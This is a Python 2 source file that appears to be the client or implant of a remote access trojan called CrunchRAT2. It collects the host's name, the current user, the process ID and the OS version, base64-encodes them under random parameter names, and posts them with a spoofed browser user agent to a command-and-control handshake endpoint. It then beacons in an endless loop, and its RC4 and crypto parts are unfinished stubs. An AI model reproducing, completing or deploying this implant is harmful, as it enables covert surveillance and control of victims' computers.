import base64, urllib, urllib2, getpass, os, platform, random, socket, string, sys, time


handshake_url = "http://127.0.0.1/CrunchRAT2/Website/handshake.php" # TO DO: Remove hard-coded value
beacon_url = "http://127.0.0.1/CrunchRAT2/Website/beacon.php" # TO DO: Remove hard-coded value
user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36" # TO DO: Remove hard-coded value
sleep_interval = 10 # TO DO: Add in sleep interval jitter


def handshake_beacon():
    hostname_var = "".join(random.choice(string.lowercase) for i in range(10))
    current_user_var = "".join(random.choice(string.lowercase) for i in range(10))
    process_id_var = "".join(random.choice(string.lowercase) for i in range(10))
    operating_system_var = "".join(random.choice(string.lowercase) for i in range(10))

    if "Darwin" in platform.system():
        globals()[operating_system_var] = "Mac OS X " + platform.mac_ver()[0]
    else:
        globals()[operating_system_var] = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]

    globals()[hostname_var] = socket.gethostname()
    globals()[current_user_var] = getpass.getuser()
    globals()[process_id_var] = os.getpid()

    post_data = [(hostname_var, globals()[hostname_var]),
        (current_user_var, globals()[current_user_var]),
        (process_id_var, globals()[process_id_var]),
        (operating_system_var, globals()[operating_system_var])]

    base64_encoded = base64.b64encode(urllib.urlencode(post_data))
    request = urllib2.Request(handshake_url, base64_encoded)
    request.add_header("User-Agent", user_agent)
    f = urllib2.urlopen(request)
    response = f.read()
    return response


def rc4_beacon():
    print "rc4 beacon here"


# TO DO: Include crypto() function here


if __name__ == "__main__":
    counter = 0

    while True:
        if counter == 0:
            k = handshake_beacon()

        else:
            rc4_beacon()

        counter += 1
        time.sleep(sleep_interval)
